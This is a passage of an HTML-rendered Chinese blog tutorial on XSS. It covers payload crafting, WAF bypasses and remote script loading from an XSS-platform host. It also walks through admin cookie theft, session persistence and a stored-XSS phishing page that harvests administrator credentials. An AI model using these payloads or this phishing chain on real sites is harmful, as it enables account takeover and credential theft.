@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Ehiyor">
+    
+    <title>
+        
+            XSS跨站漏洞 |
+        
+        Ehiyor&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/hide.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"yxhhyy.github.io","root":"/","language":"zh","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Ehiyor's blog","author":"Ehiyor","avatar":"/images/1.jpg","logo":"/images/1.jpg","favicon":"/images/logo.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                  || fa-solid fa-tags","links":"/links                || fa-solid fa-link","about":"/about                || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"童年的我偷偷抽了一口烟，厌弃又皱眉地递给了现在的我。","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/yxhhyy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"渗透测试learner"},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"updated_datetime_icon":"fa-solid fa-arrows-rotate","reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"unpkg"},"pjax":{"enable":true},"footer":{"since":null,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":["/css/hide.css"],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/1.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Ehiyor&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-link"></i>
+                                
+                                LINKS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                ABOUT
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-link"></i>
+                                </span>
+                            
+                            LINKS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            ABOUT
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        XSS跨站漏洞
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/1.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Ehiyor</span>
+                                
+                                    <span class="author-badge">渗透测试learner</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-12-14 22:14:57</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-arrows-rotate"></i>&nbsp;
+                    <span class="datetime" data-updated="Sat Dec 14 2024 22:16:25 GMT+0800">2024-12-14 22:16:25</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web%E6%BC%8F%E6%B4%9E/">web漏洞</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <blockquote>
+<p>存在xss漏洞的站点：</p>
+<p>企业站点</p>
+<p>测管理员经常上线的站点<br>
+借助社工 让管理员登录后台触发漏洞</p>
+<p>利用：<br>
+cookie盗取 欺骗管理员身份登录后台<br>
+钓鱼<br>
+黑帽seo js代码<br>
+快照劫持 页面跳转 蜘蛛劫持 钓鱼 等一系列攻击</p>
+<p>根目录/首页 head头标签里面的script代码</p>
+</blockquote>
+<h2 id="跨站脚本的实例"><a class="markdownIt-Anchor" href="#跨站脚本的实例"></a> 跨站脚本的实例：</h2>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163031762.png"></p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163329648.png"></p>
+<h2 id="xss分类"><a class="markdownIt-Anchor" href="#xss分类"></a> XSS分类</h2>
+<h3 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss"></a> 反射型XSS</h3>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163557667.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163608112.png"></p>
+<h3 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss"></a> 存储型XSS</h3>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163824605.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208163946828.png"></p>
+<h3 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss"></a> DOM型XSS</h3>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208164017118.png"></p>
+<h2 id="xss漏洞挖掘"><a class="markdownIt-Anchor" href="#xss漏洞挖掘"></a> XSS漏洞挖掘</h2>
+<h3 id="手工挖掘xss"><a class="markdownIt-Anchor" href="#手工挖掘xss"></a> 手工挖掘XSS</h3>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241208164147069.png"></p>
+<ol>
+<li>
+<p>闭合</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">#插入的内容：123<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>123<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">这么一来就把前面的标签闭合了</span><br></pre></td></tr></table></figure>
+<p>比如说我们找到了一个可以注入的地方，可以先看一眼前端代码来确定一下他的闭合方式，然后来绕过</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211215821462.png"></p>
+</li>
+<li>
+<p>长度限制</p>
+<ol>
+<li>
+<p>长度限制（前台限制）</p>
+<p>修改表单长度（maxlength）、burp抓包修改</p>
+</li>
+<li>
+<p>后台服务器/代码限制</p>
+<p>这种只能缩短代码长度</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xssye.com/sluJ</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 如何将其缩短？</span></span><br><span class="line"><span class="comment">1. &lt;script src=http://xssye.com/sluJ&gt;</span></span><br><span class="line"><span class="comment">2. &lt;script/src=//xssye.com/sluJ&gt;</span></span><br><span class="line"><span class="comment">如果想要继续缩短的话，就可以使用 URL短网址</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li>
+<p>防护（代码防护、waf 防护）</p>
+<p>前后台标签不一致：可以通过前台标签推理后台标签<br>
+如果不知道后台标签的情况下，可以尝试盲闭合（把所有的情况都写一遍）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;/&gt;<span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 闭合单引号、双引号还有标签啥的 --&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p>通用型防护</p>
+<p>根据防护的位置方式方法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;s<span class="tag">&lt;<span class="name">x</span>&gt;</span>cript/src=//t.cn/sluJ&gt;&lt;/sc<span class="tag">&lt;<span class="name">x</span>&gt;</span>ript&gt;</span><br><span class="line"><span class="comment">&lt;!-- 这种要防护的话就得找黑名单之外的标签调用了，简单一点的可以双写啥的去绕过 --&gt;</span></span><br><span class="line">&lt;script/**/src=//t.cn/sluJ&gt;</span><br><span class="line"><span class="comment">&lt;!-- 使用内联注释绕过</span></span><br></pre></td></tr></table></figure>
+<p>csp 防护：不允许调用外部的 js 进行执行，可以借助一些 fram 标签来过滤掉</p>
+</li>
+<li>
+<p>waf防护（d盾、360、云锁）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=//xssye.com/sluJ&gt; <span class="comment">&lt;!-- 这种可以过云锁 --&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211215435452.png"></p>
+<p>像这种，使用了 img 标签，然后 src 指定一个 x，这样一定会报错，一旦报错就会执行后面的 eval 命令（这里过滤了script）</p>
+<p>里面的 atob 使用来解码 base64 的</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211215725449.png"></p>
+</li>
+</ol>
+</li>
+<li>
+<p>位置问题</p>
+<p>挖掘的位置：</p>
+<ol>
+<li>
+<p>反射型XSS</p>
+<p>搜索框、URL参数位置、挖掘你提交的内容在页面中有回显的地方</p>
+</li>
+<li>
+<p>存储型XSS</p>
+<p>可以写入数据库中的，并且会被调用</p>
+<ol>
+<li>
+<p>留言</p>
+</li>
+<li>
+<p>注册（用户名，个人资料，支付宝，微信，备注，留言，银行卡信息）</p>
+</li>
+<li>
+<p>登录（用户名、管理后台 登录账号会有登录日志 ==&gt; lvycms3.0漏洞、client-ip、x-forwarded-for、请求头）</p>
+</li>
+<li>
+<p>修改资料、提交工单、打款备注、订单系统（备注位置存在很多）</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="xss-的编码"><a class="markdownIt-Anchor" href="#xss-的编码"></a> XSS 的编码</h3>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222507390.png"></p>
+<h4 id="html实体编码"><a class="markdownIt-Anchor" href="#html实体编码"></a> html实体编码</h4>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213211917409.png"></p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221416412.png"></p>
+<p>将上述代码进行编码（HTML转义）：</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221456461.png"></p>
+<p>我们将转义之后的编码直接写到 html 文件里面运行，查看运行结果</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221548071.png"></p>
+<p>可以看到直接被解码然后输出出来了，并没有被运行（解一次码，然后当做字符串输出），那我们应该怎么写？<br>
+可以单纯将内容进行编码，不对标签进行编码</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221754286.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221825165.png"></p>
+<p>再次访问发现图片可以被显示出来了（所以不可以把整条语句都进行编码，只编码值就可以）</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211221902097.png"></p>
+<p>那我们再进行一下测试，这次我们把 src=也进行编码，看看结果如何</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222049416.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222112526.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241211222150482.png"></p>
+<blockquote>
+<p>所以我们要对这种进行html实体编码同时要可以运行：</p>
+<ul>
+<li>从属性的值开始编码，要留下属性的名称，比如：src=</li>
+<li>不能把属性进行编码，也不能直接把整个标签全部进行编码</li>
+</ul>
+</blockquote>
+<h4 id="进制类编码"><a class="markdownIt-Anchor" href="#进制类编码"></a> 进制类编码</h4>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213212031252.png"></p>
+<blockquote>
+<p>对需要执行的代码进行编码，其他的地方不要乱编码</p>
+</blockquote>
+<h4 id="unicode-编码"><a class="markdownIt-Anchor" href="#unicode-编码"></a> Unicode 编码</h4>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213212206883.png"></p>
+<blockquote>
+<p>在反射型 URL 当中可以尝试 Unicode 编码</p>
+<p>JS 代码加密：如果 WAF 拦截代码的话</p>
+<p>可以尝试进行双重编码，比如 JS+html 编码</p>
+</blockquote>
+<h3 id="工具挖掘"><a class="markdownIt-Anchor" href="#工具挖掘"></a> 工具挖掘</h3>
+<blockquote>
+<p>AWVS、burp、OWASP、BruteXSS</p>
+</blockquote>
+<h2 id="xss-cookie-盗取"><a class="markdownIt-Anchor" href="#xss-cookie-盗取"></a> XSS cookie 盗取</h2>
+<p>可以使用盗取到的cookie直接登录到目标网站</p>
+<h3 id="存储型xss盗取cookie"><a class="markdownIt-Anchor" href="#存储型xss盗取cookie"></a> 存储型XSS盗取cookie</h3>
+<p>我们先找到一个可以上传的地方，同时上传的最终地点是数据库，比如留言板，然后在留言的位置直接插入XSS代码，但是要注意尝试闭合，比如留言的位置就可以使用  标签进行闭合，然后其他位置可以查看前端代码来猜测应该使用什么标签进行闭合，然后那种有长度限制的，比如这里的QQ还有邮箱，我们就可以尝试直接抓包来修改长度限制。</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221207406.png"></p>
+<p>然后我们进入到管理员后台进行查看</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221702476.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221745229.png"></p>
+<p>标签闭合成功，代码成功执行，然后我们返回到一个 XSS 平台进行查看</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213221847650.png"></p>
+<p>可以看到返回了一个管理后台的地址以及管理员cookie，这个时候我们就可以尝试 cookie 注入了，进入到管理员的后台管理系统，使用刚刚劫持到的cookie直接伪造成管理员的身份进行登录，绕过登录【其中这个的管理员地址以及cookie的传播过程会被捕捉到，可以直接在网络里面进行查看】</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213222123472.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213222421994.png"></p>
+<h3 id="反射型xss盗取cookie"><a class="markdownIt-Anchor" href="#反射型xss盗取cookie"></a> 反射型XSS盗取cookie</h3>
+<p>将 XSS 代码插入到 URL 当中，只要诱导管理员点击这个 URL 就可以拿到管理员的 cookie</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241213222624728.png"></p>
+<p>但是这种 URL 一眼就可以看出来是带有XSS的，所以我们需要伪造一下，比如：发送一个页面，就类似下面这种：上面的页面输入正常页面，然后插入一张图片对应的 SRC 是一个反射型 URL，然后我们将这个 HTML 页面使用邮箱发送给受害者，一旦受害者打开这个 HTML 页面，我们就可以在XSS平台接收到他的 cookie</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214163720027.png"></p>
+<blockquote>
+<p><strong>建立session会话控制：</strong></p>
+<p>cookie 是有有效期的，一般是7天或者是1个月，如果管理员修改了密码，那么cookie就会失效，我们可以设置一个短信提醒，提前进入到管理员后台，将 cookie 换为 session，这样就算 cookie 被修改了也可以维持登录状态</p>
+<p>保持 session：理论上，只要我们不退出后台，session就会一直有效，但是像安全狗这种类型的WAF他会强制设置session为30分钟有效期，时间一过就会强制退出重新登录</p>
+<p>我们可以使用鼠标点击器来重复上述的点击操作，然后想要使用的话就 F7 退出进行操作</p>
+</blockquote>
+<blockquote>
+<p>http-only 只读cookie<br>
+awvs：如果没有启用就会报一个中危漏洞<br>
+一旦被启用的话，就只能打到管理员后台（会返回一个地址），返回的cookie没有用或者返回为空（打不到cookie）</p>
+</blockquote>
+<h3 id="http-only-启用时的攻击"><a class="markdownIt-Anchor" href="#http-only-启用时的攻击"></a> http-only 启用时的攻击</h3>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214193422491.png"></p>
+<blockquote>
+<p>启用了 http-only，我们无法获取cookie</p>
+<ol>
+<li>
+<p>钓鱼（ <strong>通过伪造管理员后台盗取管理员账号</strong> ）</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214193634201.png"></p>
+<p>我们使用客户端浏览器将代码植入到目标网站的后台里面，管理员登录到后台之后触发代码就会弹出一个登录界面，这个界面就是我们使用VPS搭建的一个钓鱼页面，管理员一旦登录，我们就可以获取到他的账号以及密码，然后这些信息会保存到我们VPS的数据库当中</p>
+<p>这里介绍一个工具 <strong>httrack</strong>，这个工具可以用来下载网站上的一些源码（通过网站的 URL 来下载），使用这个是为了防止不同操作系统之间的编码问题导致的乱码问题（这个工具可以直接在 kali 上使用）</p>
+<p>【钓鱼实例】</p>
+<ol>
+<li>
+<p>首先我们使用 <strong>httrack</strong> 工具将要攻击的网站的源码下载下来，然后利用这些前端源码，将网站搭建在我们的 VPS 上面，这里我们在本地测试一下，使用小皮搭建一个站点进行测试</p>
+</li>
+<li>
+<p>将下载好的源码放到小皮的根目录下，之后我们需要修改一些参数，比如跳转的地址以及数据库的name</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214202122104.png"></p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214202146419.png"></p>
+</li>
+<li>
+<p>然后我们还需要两个php文件，一个是<code>index.php</code>，一个是<code>tz.php</code>文件</p>
+<p><code>index.php</code> 文件：</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214201419310.png"></p>
+<p>这个文件的主要内容就是他会接收两个参数，一个 username 和一个 password，同时会将这两个参数保存到一个admin表里面，这个表有两列，一个是 username列，一个是 password列，然后开头是一个连接数据库的命令，就是本地的数据库（如果有 VPS 就修改成 VPS 的地址），然后是数据库的账密以及指定的数据库 dd。总结就是会将接收到的账密发送到指定的数据库当中。注意开头还 include了一个 <code>tz.php</code></p>
+<p><code>tz.php</code> 文件：</p>
+<p>用来让管理员跳转到真正的后台地址的</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214202246828.png"></p>
+</li>
+<li>
+<p>然后就是最重要的一步，我们怎么才可以将这个钓鱼页面上传到目标的后台，这个时候就可以利用存储型XSS</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203517403.png"></p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203611244.png"></p>
+</li>
+<li>
+<p>然后我们切换到管理员视角，我们先进入到管理员后台</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203721856.png"></p>
+<p>一点击这个等审留言就会跳转到钓鱼页面</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214203816700.png"></p>
+<p>然后管理员就会进行登录，这个时候账密就会被传输到 VPS 的数据库上面，然后页面再次跳转，跳转到管理后台登录的首页，但是管理员只会认为需要重复登录，然后登录成功就会进入到后台页面</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214204044558.png"></p>
+<p>然后我们查看一下VPS的数据库，可以看到账密已经被记录下来了</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214204133386.png"></p>
+</li>
